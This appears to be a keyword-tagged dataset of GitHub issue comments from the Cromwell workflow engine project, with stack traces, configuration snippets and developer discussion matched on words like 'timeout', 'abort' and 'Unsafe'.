Safety,"g on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterrup",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3297,Unsafe,Unsafe,3297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,"hey @antonkulaga, sorry for the confusion - we switched to `development` to avoid having to fork the openWDL grammars:; ```wdl; version development. # ...; ```. Hope that helps!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4491#issuecomment-453547478:76,avoid,avoid,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4491#issuecomment-453547478,1,['avoid'],['avoid']
Safety,"https://gatkforums.broadinstitute.org/firecloud/discussion/11853/error-message-the-job-was-aborted-from-outside-cromwell. AC: The message ""Job was aborted from outside Cromwell"" itself doesn't have enough information to understand what happened, and what to do next. It seems like there are two known failures that can lead to that error message:. 1. As described above, when an operation self-cancels due to a timeout, Cromwell could supplement the existing message with:; ```Jobs that run for longer than a week are not yet supported, and thus this job was cancelled because it exceeded that upper-limit. Please try to reduce the duration of your job. To get more details about your jobs, here are links to the stdout/stderr files...```. 2. As described in the forum post above, when Cromwell restarts a workflow and a job had been started by the engine/backend but didn't have an op id -- it gets marked as a failed job with the same error. Instead, if Cromwell knows that the reason it couldn't find an op id was because it is restarting -- then it should not report the message it does today at all and simply say:; ```When Cromwell restarted, it realized the job was not yet started, and so this is a benign failure. Cromwell will try attempting to execute this job again.```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-424966266:91,abort,aborted-from-outside-cromwell,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-424966266,6,"['abort', 'timeout']","['aborted', 'aborted-from-outside-cromwell', 'timeout']"
Safety,"il.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3813,Unsafe,Unsafe,3813,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,it's trivial to do. there's a slight risk involved in that theoretically some WDL would be broken but there's a 100% chance those WDLs become broken in the future anyways.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-335815243:37,risk,risk,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-335815243,1,['risk'],['risk']
Safety,"just want to also be sure to make it clear there are more issues related to that forum post than this specific issue - this one is on making sure the task statuses reach a final state when the workflow ends in a terminal state - that's different than aborts not working - both are an issue, but different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334478731:251,abort,aborts,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334478731,2,['abort'],['aborts']
Safety,"l's activity when it's building a metadata of around 2.8M metadata events. Building metadata without streaming:; ![screen shot 2018-10-17 at 11 16 32 am](https://user-images.githubusercontent.com/2978948/47925639-134b5e80-de95-11e8-8ce3-43f52c4a4067.png). We can see that memory builds up throughout the process of generating the JSON, with a larger burst towards the end. CPU activity is inexistent until the very end where a lot of CPU resources are needed to go through all the events and build the json. Building metadata with streaming:; ![screen shot 2018-10-17 at 10 08 08 am](https://user-images.githubusercontent.com/2978948/47925627-0d557d80-de95-11e8-8ad0-14444456c05a.png). In contrast, here there is moderate CPU activity throughout the process, as well as lots of a much more sawtooth-looking heap graph, indicating that objects are getting GCed a lot. The max memory used is also smaller than for the non streaming version. - Using a streaming approach allows the stream to be stopped at any point in time (say if we ran over the endpoint timeout).; Note that even without streaming data from the database, we can still build the json from the strict set of events using an fs2 stream and stop that if/when needed. Another graph where Cromwell was asked to build several large metadata jsons:. ![screen shot 2018-10-19 at 1 17 28 pm](https://user-images.githubusercontent.com/2978948/47926437-ee57eb00-de96-11e8-89b4-a7df8db9e164.png); Red is non streaming, blue is streaming. ---; The main takeaway is that when **under memory pressure** (i.e when available memory is insufficient to build the requested metadata), streaming makes a significant difference on relieving the heap usage for medium to large (> 100K) metadata. ### The less good. - Response time is not as good. The use cases above were specifically targeted towards trying to build large to very large metadata.; However when used in a more realistic scenario with lots of small sized metadata and few large ones, the over",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:1590,timeout,timeout,1590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,1,['timeout'],['timeout']
Safety,"low_var_refs (1 minute, 46 seconds); - should successfully run subdirectory (1 minute, 16 seconds); - should successfully run subworkflows_in_ifs (1 minute, 47 seconds); - should successfully run taskless_engine_functions (16 seconds, 277 milliseconds); - should successfully run test_file_outputs_from_input (45 seconds, 789 milliseconds); - should successfully run three_step__subwf_cwl (2 minutes, 33 seconds); - should successfully run tmp_dir (1 minute, 6 seconds); - should successfully run valid_labels (37 seconds, 78 milliseconds); - should successfully run variable_scoping (38 seconds, 77 milliseconds); - should successfully run wdl_empty_glob (46 seconds, 965 milliseconds); - should successfully run wdl_function_locations (1 minute, 37 seconds); - should successfully run workflow_engine_functions (21 seconds, 482 milliseconds); - should successfully run workflow_output_declarations (46 seconds, 853 milliseconds); - should successfully run workflow_type_and_version_wdl (40 seconds, 392 milliseconds); - should successfully run workflow_url_biscayne_sub_wfs (35 seconds, 322 milliseconds); - should successfully run workflow_url_http_relative_imports (35 seconds, 718 milliseconds); - should successfully run workflow_url_square (15 seconds, 152 milliseconds); - should successfully run workflow_url_sub_workflow_hello_world (53 seconds, 160 milliseconds); - should successfully run workflowenginefunctions (45 seconds, 630 milliseconds); - should successfully run writeToCache (1 minute, 15 seconds); - should successfully run write_lines (1 minute, 55 seconds); - should successfully run write_lines_files (3 minutes, 5 seconds); - should successfully run write_tsv (56 seconds, 21 milliseconds); - should NOT call cache the second run of call_cache_hit_prefixes_empty_hint_local !!! IGNORED !!!; - should NOT call cache the second run of call_cache_hit_prefixes_two_roots_empty_hint_cache_miss_papi !!! IGNORED !!!; - should abort a workflow mid run and restart immediately abort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:16517,abort,abort,16517,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety,"me typos in the instructions (e.g., `MYPASSWORD` instead of `MYSQL_PASSWORD`), it looks that there is a conectivity problem with the docker container running mysql. Steps to reproduce:. ```bash; # start mysql-server container; docker run -p 3306:3306 --name cromwell_db -e MYSQL_ROOT_PASSWORD=`cat my_sql.root.pwd` -e MYSQL_DATABASE=cromwell -e MYSQL_USER=cromwell -e MYSQL_PASSWORD=cromwell -d mysql/mysql-server:5.7; ```. The docker server is working and I can access the database using `docker exec -it cromwell_db mysql -u cromwell -p`. Adding to my configuration file:. ```; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?useSSL=false""; user = ""cromwell""; password = ""cromwell""; connectionTimeout = 5000; }; }; ```. And running locally:. ```bash; JAVA_OPTS=""-Dconfig.file=local.conf"" cromwell run --inputs inputs.json --metadata-output metadata-output.json workflow.wdl; ```. Produces the following log, which is the same even increasing the timeout:. ```; [2018-03-12 11:25:38,45] [info] Running with database db.url = jdbc:mysql://localhost/cromwell?useSSL=false; Exception in thread ""main"" java.lang.ExceptionInInitializerError; 	at cromwell.server.CromwellSystem.$init$(CromwellSystem.scala:24); 	at cromwell.CromwellEntryPoint$$anon$2.<init>(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.$anonfun$buildCromwellSystem$1(CromwellEntryPoint.scala:63); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.CromwellEntryPoint$.buildCromwellSystem(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:47); 	at cromwell.CommandLineParser$.runCromwell(CommandLineParser.scala:95); 	at cromwell.CommandLineParser$.delayedEndpoint$cromwell$CommandLineParser$1(CommandLineParser.scala:105); 	at cromwell.CommandLineParser$delayedInit$body.apply(CommandLineParser.scala:8); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:1151,timeout,timeout,1151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['timeout'],['timeout']
Safety,"n Get; required); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1501, in _GetProperty; value = _GetPropertyWithoutDefault(prop, properties_file); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1539, in _GetPropertyWithoutDefault; value = callback(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 693, in _GetGCEProject; return c_gce.Metadata().Project(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; return func(*args, **kwargs), None; File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoProxyWithCleanFailures; return gce_read.ReadNoProxy(uri); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; request, timeout=timeout_property).read(); File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; response = self._open(req, data); File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; '_open', req); File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; result = func(*args); File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; return self.do_open(httplib.HTTPConnection, req); File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; r = h.getresponse(buffering=True); File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; response.begin(); File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; version, status, reason = self._read_status(); File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; line = self.fp.readline(); File ""/usr/lib/python2.7/socket.py"", line 447, in readline; data = self._sock.recv(self._rbufsize); socket.timeout: timed out; :; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:4310,timeout,timeout,4310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,2,['timeout'],['timeout']
Safety,on.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:695); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:707); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:704); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1258); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1254); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929:2672,recover,recoverWith,2672,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929,1,['recover'],['recoverWith']
Safety,"other benefit is that we'd reduce our dependency on dockerhub. Green team is seeing issues that look like they're throttling us, namely a bunch of these:. ```; Execution failed: pulling image: docker pull: generic::unknown: retry budget exhausted (10 attempts): ; running [""docker"" ""pull"" ""google/cloud-sdk:slim""]: exit status 1 (standard error: ""Error response from ; daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection ; (Client.Timeout exceeded while awaiting headers)\n"") at ; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4640#issuecomment-463034541:481,Timeout,Timeout,481,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4640#issuecomment-463034541,1,['Timeout'],['Timeout']
Safety,rebasing to develop is causing all the tests to timeout :(,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/868#issuecomment-220802012:48,timeout,timeout,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/868#issuecomment-220802012,1,['timeout'],['timeout']
Safety,"related to #2399 and #2830 . As a **Cromwell dev**, I want to **automatically release Cromwell once Travis is green**, so that **Travis doesn't release when it's failing**.; - effort: small; - risk: small; - business value: small (to medium); - have there been any regressions that Travis would have caught but it was red when we released?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2401#issuecomment-344715964:193,risk,risk,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2401#issuecomment-344715964,1,['risk'],['risk']
Safety,"right now that's not the default in FC, nor do we expose it in the UI - people have used it and it does help for some circumstances where you need it, but it seems like overkill when all you want is reliable statuses. it also won't help with the aborting issue which is what the gatk post was",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334489869:246,abort,aborting,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334489869,1,['abort'],['aborting']
Safety,risk is negligible ; effort is probably higher than it should be but still shouldn't be too much,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-327532339:0,risk,risk,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-327532339,1,['risk'],['risk']
Safety,"rrors on our HPC that occur randomly and qsub/qstat go down temporarily and result in `failed (during ExecutingWorkflowState): java.lang.RuntimeException: Unable to start job.`. I was hoping this would retry failed submissions. . This is my current config:. ```; include required(classpath(""application"")). webservice {; port = 8000; interface = 127.0.0.1; }. #call-caching {; # enabled = true; # invalidate-bad-cache-results = true; #}. system {; job-rate-control {; jobs = 20; per = 1 second; }; }. backend {; default = SGE. providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 10; root = ""cromwell-executions""; run-in-background = true. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; String ? docker; String ? docker_user; """""". submit = ""/bin/bash ${script}"". submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """""". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""file""; check-sibling-md5: false; }; }; }; }; }. SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; root = ""cromwell-executions""; exit-code-timeout-seconds = 600; concurrent-job-limit = 100. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; Int cpu = 1; Float ? memory_gb; String sge_queue = ""dgdcloud.q""; String ? sge_project; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l h_vmem="" + memory_gb / cpu + ""g""} \; ${""-l mem_free="" + memory_gb / cpu + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362:1486,timeout,timeout-seconds,1486,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362,1,['timeout'],['timeout-seconds']
Safety,"ry, etc. that the scientist has written all the magic into, that takes some input arguments (data, poutputs, thresholds, etc.) and ""does the scientific thing"" to return to the workflow manager (cromwell) that is controlling its run via the backend. ## What does Singularity + Cromwell look like?. People keep saying these two together, and I've been struggling to figure it out. I've been doing a lot of work trying to do that. What does it mean for Singularity to be a part of Cromwell. I first logically thought it would mean a backend, because the basic exec / run commands for Singularity don't change much (but arguments do!). But it doesn't fit well here because it's missing that API to make it a fully fledged service. To those familiar with Singularity, this is the instance command group (and not running containers as images). Then I thought it was really more of a workflow executable. But if this is the case, why is it special at all? It doesn't really fit because there is still going to be a lot of redundancy in specifying the ""singularity run <container> <args> bit over and over again. So I think (eventually) all these use cases could fit into cromwell,. - running a singularity container as an executable with a backend like slurm; - running a singularity container as an executable on with Local (host) backend; - running a container as a backend as a container instance (via its API). but for now, without a clean API for services, only the first two really make sense. Singularity is not special. It's just a binary. ## Why has it been so confusing?. We get Singularity confused with Docker, because they are both containers. Same thing right? Sort of, but not exactly. Docker is a container technology, but actually it's older and has had time to develop a full API for services. It meets the criteria for both a backend and an executable, and this is because it can be conceptualized as both ""a thing that you run"" and ""the thing that is the container you run in."" But it's c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:2575,redund,redundancy,2575,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,2,['redund'],['redundancy']
Safety,"scala:135); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2018-10-23 17:49:24,53] [info] WorkflowManagerActor WorkflowActor-d186ca94-b85b-4729-befc-8ad28a05976c is in a terminal state: WorkflowFailedState; [2018-10-23 17:49:27,64] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2018-10-23 17:49:32,16] [info] Workflow polling stopped; [2018-10-23 17:49:32,17] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2018-10-23 17:49:32,18] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-10-23 17:49:32,18] [info] Aborting all running workflows.; [2018-10-23 17:49:32,18] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-10-23 17:49:32,19] [info] JobExecutionTokenDispenser stopped; [2018-10-23 17:49:32,19] [info] WorkflowStoreActor stopped; [2018-10-23 17:49:32,20] [info] WorkflowLogCopyRouter stopped; [2018-10-23 17:49:32,20] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor All workflows finished; [2018-10-23 17:49:32,20] [info] Connection pools shut down; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] SubWorkflowStoreActor stopped; [2018-10-23 17:49:32,21] ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:7449,Timeout,Timeout,7449,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,3,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,"size is the problem. Does the issue persist after restarting the server? I committed a change to; the develop branch a few weeks ago that does a better job of cleaning up; the copying resources. If the restart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutExcepti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1028,timeout,timeout,1028,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['timeout'],['timeout']
Safety,spatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); 